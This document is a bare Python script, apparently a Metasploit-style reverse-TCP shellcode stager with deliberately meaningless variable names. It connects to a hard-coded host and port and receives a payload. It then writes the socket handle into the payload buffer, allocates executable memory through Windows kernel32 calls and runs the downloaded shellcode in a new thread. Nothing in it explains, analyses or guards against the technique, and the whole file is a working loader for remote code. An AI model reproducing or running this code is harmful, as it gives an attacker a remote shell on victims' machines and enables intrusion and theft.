import struct, socket, binascii, ctypes, random, time
var1, var2 = None, None
def func1():
	try:
		global var2
		var2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		var2.connect(('192.168.1.115', 8444))
		var3 = struct.pack('<i', var2.fileno())
		l = struct.unpack('<i', var2.recv(4))[0]
		datastream = b"     "
		while len(datastream) < l: datastream += var2.recv(l)
		cbuffer = ctypes.create_string_buffer(datastream, len(datastream))
		cbuffer[0] = binascii.unhexlify('BF')
		for i in range(4): cbuffer[i+1] = var3[i]
		return cbuffer
	except Exception as e:
		raise e
def func2(arg3):
	if arg3 != None:
		binarg2 = bytearray(arg3)
		#kernel32 = ctypes.cdll.LoadLibrary("kernel32.dll") #kernel32.dll
		#kernel32.VirtualAlloc.restype = ctypes.c_uint64 #c_uint64
		shellcode_ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(binarg2)),ctypes.c_uint64(0x3000),ctypes.c_uint64(0x40))
		#shellcode_ptr = kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(buf_size), 0x3000, 0x40) #
		ctypes.windll.kernel32.VirtualLock(ctypes.c_uint64(shellcode_ptr), ctypes.c_int(len(binarg2)))
		cbuff_ptr = (ctypes.c_char * len(binarg2)).from_buffer(binarg2)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int64(shellcode_ptr), cbuff_ptr, ctypes.c_int(len(binarg2)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_uint64(shellcode_ptr),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
var1 = func1()
func2(var1)
